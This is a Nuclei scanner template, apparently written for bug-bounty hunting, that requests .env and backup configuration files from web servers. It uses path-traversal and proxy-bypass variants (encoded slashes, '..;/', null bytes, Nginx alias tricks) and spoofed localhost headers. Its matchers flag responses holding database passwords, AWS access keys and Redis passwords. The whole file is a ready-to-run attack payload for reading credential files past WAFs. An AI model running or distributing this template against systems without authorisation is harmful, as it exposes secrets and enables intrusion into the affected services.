id: ghost-env-hunter

info:
  name: Deep Environment Backup Exposure (Proxy Bypass Edition)
  author: Sniper-Predator
  severity: high
  description: Mengintai file konfigurasi dengan teknik WAF/Reverse Proxy Bypass.
  tags: exposure,config,backup,bypass,custom

requests:
  - method: GET
    path:
      # Standard Paths
      - "{{BaseURL}}/.env"
      - "{{BaseURL}}/.env.staging"
      - "{{BaseURL}}/.env.backup"
      # Tomcat/Spring Proxy Bypasses (Goldmine untuk Tier-1)
      - "{{BaseURL}}/api/..;/.env"
      - "{{BaseURL}}/%2e/.env"
      - "{{BaseURL}}/.env%00"
      - "{{BaseURL}}/%20/.env"
      - "{{BaseURL}}//.env"
      - "{{BaseURL}}/./.env"
      - "{{BaseURL}}/%ef%bc%8f.env"
      # Nginx Alias Misconfigurations
      - "{{BaseURL}}/assets/..%2f.env"
      - "{{BaseURL}}/static/..%2f.env"
      - "{{BaseURL}}/public/..%2f..%2f.env"

    headers:
      Cache-Control: "max-age=0"
      X-Forwarded-For: "127.0.0.1"
      X-Originating-IP: "127.0.0.1"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "DB_PASSWORD="
          - "AWS_ACCESS_KEY_ID="
          - "APP_ENV="
          - "REDIS_PASSWORD="
        condition: or
      # ANTI-HTML TRAP
      - type: word
        words:
          - "<html"
          - "<!doctype"
          - "<body"
        condition: or
        negative: true
